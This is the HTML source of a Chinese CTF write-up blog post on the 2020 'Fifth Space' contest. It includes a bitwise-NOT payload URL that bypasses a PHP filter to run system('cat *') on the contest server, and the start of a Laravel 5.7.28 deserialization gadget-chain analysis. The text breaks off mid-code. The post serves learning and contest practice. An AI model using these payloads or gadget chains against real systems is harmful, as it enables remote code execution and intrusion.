@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>“第五空间”智能安全大赛2020 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="“第五空间”智能安全大赛2020 Writeup" />
+<meta property="og:description" content="第一次跟php代码，在学长的提示下找到了利用点，记一下审计过程" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://clq0.top/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup/" />
+<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="article:published_time" content="2020-06-25T20:40:17+08:00" />
+<meta property="article:modified_time" content="2020-06-25T20:40:17+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+
+<meta name="twitter:title" content="“第五空间”智能安全大赛2020 Writeup"/>
+<meta name="twitter:description" content="第一次跟php代码，在学长的提示下找到了利用点，记一下审计过程"/>
+<meta name="application-name" content="Leon&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup/" /><link rel="prev" href="https://clq0.top/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" /><link rel="next" href="https://clq0.top/%E5%8F%88%E8%A7%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8phpuns-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "“第五空间”智能安全大赛2020 Writeup",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/clq0.top\/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup\/"
+        },"genre": "posts","keywords": "unserialize","wordcount":  3940 ,
+        "url": "https:\/\/clq0.top\/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup\/","datePublished": "2020-06-25T20:40:17+08:00","dateModified": "2020-06-25T20:40:17+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+                "@type": "Person",
+                "name": "Leon"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">“第五空间”智能安全大赛2020 Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-25">2020-06-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3940 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;<span id="/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup/" class="leancloud_visitors" data-flag-title="“第五空间”智能安全大赛2020 Writeup">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#hate-php">hate-php</a></li>
+    <li><a href="#laravel">laravel</a>
+      <ul>
+        <li><a href="#确定版本">确定版本：</a></li>
+        <li><a href="#寻找可用poc链">寻找可用poc链</a></li>
+        <li><a href="#pop链构造">pop链构造</a></li>
+      </ul>
+    </li>
+    <li><a href="#do-you-know">do you know</a>
+      <ul>
+        <li><a href="#gopher的构造"><code>Gopher</code>的构造</a>
+          <ul>
+            <li><a href="#get">GET</a></li>
+            <li><a href="#post">POST</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>第一次跟php代码，在学长的提示下找到了利用点，记一下审计过程</p>
+<h2 id="hate-php">hate-php</h2>
+<p>源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
+    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(f|l|a|g|\.|p|h|\/|;|\&#34;|\&#39;|\`|\||\[|\]|\_|=)/i&#39;</span><span class="p">,</span><span class="nv">$code</span><span class="p">))</span> <span class="p">{</span> 
+        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You are too good for me&#39;</span><span class="p">);</span> 
+    <span class="p">}</span>
+    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="nx">get_defined_functions</span><span class="p">()[</span><span class="s1">&#39;internal&#39;</span><span class="p">];</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span> 
+        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span> <span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/im&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">))</span> <span class="p">{</span> 
+            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You deserve better&#39;</span><span class="p">);</span> 
+        <span class="p">}</span> 
+    <span class="p">}</span>
+    <span class="nx">assert</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到过滤了一些单个字符和所有的php内置函数
+只要绕过正则匹配就好
+可以用异或或者取反构造shell，这里用取反：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s2">&#34;system&#34;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s2">&#34;cat *&#34;</span><span class="p">);</span>
+<span class="c1">//echo ~(urldecode(&#34;%8D%9A%9E%9B%99%96%93%9A&#34;));
+</span><span class="c1"></span><span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>构造一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://121.36.74.163/?code=(~%8C%86%8C%8B%9A%92)((~%9C%9E%8B%DF%D5))
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625150049.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625150049.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625150049.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625150049.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200625150049.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200625150049.png" /></p>
+<h2 id="laravel">laravel</h2>
+<h3 id="确定版本">确定版本：</h3>
+<p>在<code>vendor\laravel\framework\src\Illuminate\Foundation\Application.php</code>32行看到5.7.28版本，这个版本存在反序列化漏洞
+然后利用搜索引擎找到了一堆复现
+但是一跟进，发现<code>PendingCommand.php</code>中析构函数删掉了掉用<code>run()</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625161246.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625161246.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625161246.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625161246.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200625161246.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200625161246.png" /></p>
+<h3 id="寻找可用poc链">寻找可用poc链</h3>
+<p>只能另辟蹊径，找到这篇文章：<a href="https://xz.aliyun.com/t/2901" target="_blank" rel="noopener noreffer">2018护网杯easy_laravel getshell</a>
+继续尝试跟进，看能不能利用这个链，发现<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code>里的析构函数也被ban了：（嘤嘤嘤）
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625162946.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625162946.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625162946.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625162946.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200625162946.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200625162946.png" /></p>
+<p>但是析构函数多的是，这个没了换一个就是了，主要是之前没法调用<code>run()</code>执行命令，看下这个链里的<code>Generator</code>类相关的执行命令函数且有没有被ban：
+在<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>里，发现<code>function format($formatter, $arguments = array())</code>调用了<code>call_user_func_array()</code>，如果它的输入能被控制，就能执行命令
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625164439.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625164439.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625164439.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625164439.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200625164439.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200625164439.png" /></p>
+<p>继续跟进：
+Generator.php源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="k">namespace</span> <span class="nx">Faker</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">Generator</span>
+<span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$providers</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="k">protected</span> <span class="nv">$formatters</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">addProvider</span><span class="p">(</span><span class="nv">$provider</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nx">array_unshift</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">providers</span><span class="p">,</span> <span class="nv">$provider</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">getProviders</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">providers</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">seed</span><span class="p">(</span><span class="nv">$seed</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$seed</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">mt_srand</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">PHP_VERSION_ID</span> <span class="o">&lt;</span> <span class="mi">70100</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">mt_srand</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$seed</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nx">mt_srand</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$seed</span><span class="p">,</span> <span class="nx">MT_RAND_PHP</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">format</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">,</span> <span class="nv">$arguments</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">),</span> <span class="nv">$arguments</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">];</span>
+        <span class="p">}</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">providers</span> <span class="k">as</span> <span class="nv">$provider</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$provider</span><span class="p">,</span> <span class="nv">$formatter</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$provider</span><span class="p">,</span> <span class="nv">$formatter</span><span class="p">);</span>
+
+                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">];</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nx">\InvalidArgumentException</span><span class="p">(</span><span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;Unknown formatter &#34;%s&#34;&#39;</span><span class="p">,</span> <span class="nv">$formatter</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">parse</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">preg_replace_callback</span><span class="p">(</span><span class="s1">&#39;/\{\{\s?(\w+)\s?\}\}/u&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;callFormatWithMatches&#39;</span><span class="p">),</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">protected</span> <span class="k">function</span> <span class="nf">callFormatWithMatches</span><span class="p">(</span><span class="nv">$matches</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">format</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$attribute</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">format</span><span class="p">(</span><span class="nv">$attribute</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">format</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在277行发现魔术方法<code>__call()</code>调用了<code>format()</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625164630.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625164630.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625164630.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200625164630.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200625164630.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200625164630.png" /></p>
+<p>我们知道当调用一个不存在的方法时会自动调用<code>__call()</code>，并且这里<code>__call()</code>调用了<code>format()</code>且参数可控，就可以执行命令了</p>
+<p>接下来寻找合适的类完成它的触发：
+在<code>vendor/symfony/routing/Loader/Configurator/ImportConfigurator.php</code>中找到合适的析构函数：
+源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="k">namespace</span> <span class="nx">Symfony\Component\Routing\Loader\Configurator</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nx">Symfony\Component\Routing\Route</span><span class="p">;</span>
+<span class="k">use</span> <span class="nx">Symfony\Component\Routing\RouteCollection</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">ImportConfigurator</span>
+<span class="p">{</span>
+    <span class="k">use</span> <span class="nx">Traits\RouteTrait</span><span class="p">;</span>
+
+    <span class="k">private</span> <span class="nv">$parent</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nx">RouteCollection</span> <span class="nv">$parent</span><span class="p">,</span> <span class="nx">RouteCollection</span> <span class="nv">$route</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parent</span> <span class="o">=</span> <span class="nv">$parent</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route</span> <span class="o">=</span> <span class="nv">$route</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
